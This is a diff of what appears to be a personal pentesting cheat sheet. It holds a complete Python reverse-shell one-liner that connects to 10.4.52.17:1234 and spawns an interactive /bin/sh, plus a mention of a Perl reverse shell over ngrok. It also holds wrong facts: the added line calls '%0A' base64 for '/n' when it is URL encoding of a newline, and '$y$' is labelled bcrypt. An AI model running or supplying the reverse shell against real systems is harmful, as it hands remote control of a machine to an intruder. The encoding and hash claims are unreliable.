@@ -1,6 +1,8 @@
 $6$ = sha512
 $y$, $2a$ = bcrypt
 
+%0A = /n (base64 encoding)
+
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.52.17",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 perl reverse shell payload (with ngrok port forwarding)
